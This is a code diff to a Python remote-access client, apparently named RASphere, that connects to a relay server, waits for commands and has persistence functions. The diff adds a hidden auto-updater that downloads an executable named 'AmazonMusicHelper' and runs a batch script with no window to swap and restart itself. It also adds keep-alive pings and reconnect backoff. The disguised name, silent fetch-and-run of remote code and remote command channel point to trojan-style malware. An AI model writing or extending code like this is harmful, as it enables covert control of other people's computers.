@@ -23,7 +23,10 @@ from collections import deque
 _SERVER  = "https://rasphere.onrender.com"   # Relay server URL
 _SECRET  = "rasphere-client-key-2024"        # Client secret key
 _RECON   = 5                                  # Reconnect delay (seconds)
+_RECON_MAX = 120                              # Max reconnect delay for exponential backoff
 _CLIENT_ID = None                             # None = auto-generate
+_VERSION = "1.0.0"                           # Client version for auto-update checking
+_KEEPALIVE = 300                              # Keep-alive ping interval (seconds) to prevent Render sleep
 # ══════════════════════════════════════════════════════════════════════
 
 # ── Optional deps ────────────────────────────────────────────────────
@@ -522,6 +525,92 @@ def _fwrite(path, b64, offset=0, mode="wb"):
         return True, "ok"
     except Exception as e: return False, str(e)
 
+# ── Auto-Updater ─────────────────────────────────────────────────────
+def _check_for_update(server_url):
+    """Check server for a new client version. Returns (new_version, download_url) or (None, None)."""
+    try:
+        import urllib.request
+        check_url = server_url.rstrip("/") + "/api/client-update"
+        r = urllib.request.urlopen(check_url, timeout=15)
+        data = json.loads(r.read().decode())
+        remote_ver = (data.get("version") or "").strip()
+        download_url = (data.get("download_url") or "").strip()
+        if not remote_ver or not download_url:
+            log.info("No update info configured on server")
+            return None, None
+        if remote_ver != _VERSION:
+            log.info(f"Update available: v{_VERSION} -> v{remote_ver}")
+            return remote_ver, download_url
+        else:
+            log.info(f"Client is up to date (v{_VERSION})")
+            return None, None
+    except Exception as e:
+        log.warning(f"Update check failed: {e}")
+        return None, None
+
+def _download_and_install(download_url, new_version):
+    """Download the new .exe and stage a batch script to replace+restart."""
+    try:
+        import urllib.request
+        pd = _pdir()
+        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
+        log.info(f"Downloading update from {download_url}...")
+        urllib.request.urlretrieve(download_url, new_exe)
+        log.info(f"Downloaded to {new_exe}")
+
+        # Build batch script to swap and restart
+        current_exe = _exepath()
+        bat_path = os.path.join(os.environ.get("TEMP", pd), "rasphere_update.bat")
+        with open(bat_path, "w") as f:
+            f.write(f'''@echo off
+chcp 65001 >nul
+title RASphere Update
+echo Updating RASphere client...
+timeout /t 3 /nobreak >nul
+echo Installing new version...
+copy /y "{new_exe}" "{current_exe}" >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Copy failed - retrying...
+    timeout /t 2 /nobreak >nul
+    copy /y "{new_exe}" "{current_exe}" >nul 2>&1
+)
+echo Cleaning up installer...
+del "{new_exe}" >nul 2>&1
+echo Starting new version...
+start "" "{current_exe}"
+del "%~f0" >nul 2>&1
+exit
+''')
+        log.info(f"Update script written to {bat_path}")
+
+        # Launch the batch script detached and exit
+        if sys.platform == "win32":
+            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
+            log.info("Update script launched - exiting to apply update")
+        else:
+            log.error("Auto-update is Windows-only for now")
+            return False
+        return True
+    except Exception as e:
+        log.error(f"Update download/install failed: {e}")
+        return False
+
+_keepalive_stop = threading.Event()
+
+def _keepalive_pinger(server_url):
+    """Periodically ping the server health endpoint to prevent Render from sleeping."""
+    import urllib.request
+    health_url = server_url.rstrip("/") + "/api/health"
+    while not _keepalive_stop.is_set():
+        _keepalive_stop.wait(_KEEPALIVE)
+        if _keepalive_stop.is_set():
+            break
+        try:
+            urllib.request.urlopen(health_url, timeout=10)
+            log.debug("Keep-alive ping OK")
+        except Exception as e:
+            log.debug(f"Keep-alive ping failed: {e}")
+
 # ── Persistence ──────────────────────────────────────────────────────
 def _exepath():
     if getattr(sys, 'frozen', False): return sys.executable
@@ -875,17 +964,42 @@ def main():
                           reconnection_delay_max=30, logger=False, engineio_logger=False)
     setup_handlers(sio); state.sio = sio
 
+    # Start keep-alive pinger to prevent Render from sleeping
+    threading.Thread(target=_keepalive_pinger, args=(state.url,), daemon=True).start()
+
+    update_checked = False
+    current_delay = rec  # current backoff delay, grows on failures
+
     while True:
         try:
             log.info(f"Connecting to {state.url}...")
             sio.connect(state.url, wait_timeout=10)
             log.info("Connected! Waiting for commands...")
+
+            # Reset backoff on successful connection
+            current_delay = rec
+
+            # Check for updates on first successful connection
+            if not update_checked:
+                new_ver, dl_url = _check_for_update(state.url)
+                update_checked = True
+                if new_ver and dl_url:
+                    log.info(f"New version {new_ver} available, applying update...")
+                    ok = _download_and_install(dl_url, new_ver)
+                    if ok:
+                        log.info("Exiting for update...")
+                        sio.disconnect()
+                        os._exit(0)
+
             sio.wait()
         except KeyboardInterrupt: log.info("Shutdown"); break
         except Exception as e:
             log.error(f"Connection error: {e}")
             if not rec: break
-            log.info(f"Reconnecting in {rec}s..."); time.sleep(rec)
+            log.info(f"Reconnecting in {current_delay}s...")
+            time.sleep(current_delay)
+            # Exponential backoff: double delay, cap at _RECON_MAX
+            current_delay = min(current_delay * 2, _RECON_MAX)
     sio.disconnect(); log.info("Stopped")
 
 if __name__ == "__main__": main()
